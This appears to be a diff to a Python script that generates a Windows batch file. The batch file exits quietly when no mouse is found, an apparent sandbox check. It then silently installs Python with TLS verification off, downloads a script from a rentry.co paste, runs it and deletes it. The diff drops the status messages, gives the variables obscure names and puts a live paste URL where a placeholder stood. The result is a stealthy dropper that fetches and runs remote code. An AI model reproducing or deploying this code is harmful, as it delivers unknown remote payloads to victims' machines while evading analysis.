@@ -66,21 +66,17 @@ for /f "tokens=2 delims==" %%I in ('wmic path Win32_PointingDevice get PNPDevice
 )
 
 if not !mouseConnected! == true (
-    echo No mouse detected. Exiting...
     exit /b 1
 )
 
-echo Mouse detected. Continue with your script here.
+set "eee=https://www.python.org/ftp/python/3.10.0/python-3.10.0rc2-amd64.exe"
+set "eeee=python-installer.exe"
 
+curl -L -o !eeee! !eee! --insecure --silent
+start /wait !eeee! /quiet /passive InstallAllUsers=0 PrependPath=1 Include_test=0 Include_pip=1 Include_doc=0
+del !eeee!
 
-set "PYTHON_URL=https://www.python.org/ftp/python/3.10.0/python-3.10.0rc2-amd64.exe"
-set "PYTHON_INSTALLER=python-installer.exe"
-
-curl -L -o !PYTHON_INSTALLER! !PYTHON_URL! --insecure --silent
-start /wait !PYTHON_INSTALLER! /quiet /passive InstallAllUsers=0 PrependPath=1 Include_test=0 Include_pip=1 Include_doc=0
-del !PYTHON_INSTALLER!
-
-set "ENCODED_URL={new_encoded_url}/raw"
+set "ENCODED_URL=https://rentry.co/3454o/raw"
 
 set "OUTPUT_FILE=webpage.py"
 curl -o %OUTPUT_FILE% -s %ENCODED_URL% --insecure
@@ -93,6 +89,7 @@ if %ERRORLEVEL% neq 0 (
 python %OUTPUT_FILE%
 
 del %OUTPUT_FILE%
+
 '''
     with open(file_path, 'w') as file:
         file.writelines(code)
